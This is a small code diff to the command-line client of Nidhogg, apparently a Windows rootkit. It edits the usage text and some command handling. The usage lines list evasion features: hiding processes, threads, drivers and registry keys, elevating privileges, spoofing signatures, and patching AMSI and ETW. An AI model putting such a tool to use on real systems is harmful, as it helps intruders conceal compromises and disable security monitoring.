@@ -43,9 +43,9 @@ constexpr const char* ASCII_ART = "";
 void PrintUsage() {
 	std::cout << "[ * ] Possible usage:" << std::endl;
 	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
+	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | query ] [tid]" << std::endl;
 	std::cout << "\tNidhoggClient.exe module [hide | unhide] [pid] [module path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe driver [hide | unhide] [driver path]" << std::endl;
-	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | query ] [tid]" << std::endl;
 	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
 	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
@@ -330,10 +330,6 @@ int wmain(int argc, const wchar_t* argv[]) {
 		if (_wcsicmp(argv[1], L"process") == 0) {
 			success = nidhoggInterface.ProcessElevate(_wtoi(argv[3]));
 		}
-		else if (_wcsicmp(argv[1], L"thread") == 0) {
-			std::cerr << "[ ! ] TBA" << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-		}
 		else {
 			success = NIDHOGG_INVALID_OPTION;
 		}
@@ -375,6 +371,8 @@ int wmain(int argc, const wchar_t* argv[]) {
 			for (int i = 0; i < result.size(); i++) {
 				std::cout << "\t" << result[i] << std::endl;
 			}
+
+			success = NIDHOGG_SUCCESS;
 			break;
 		}
 		else if (_wcsicmp(argv[1], L"thread") == 0) {
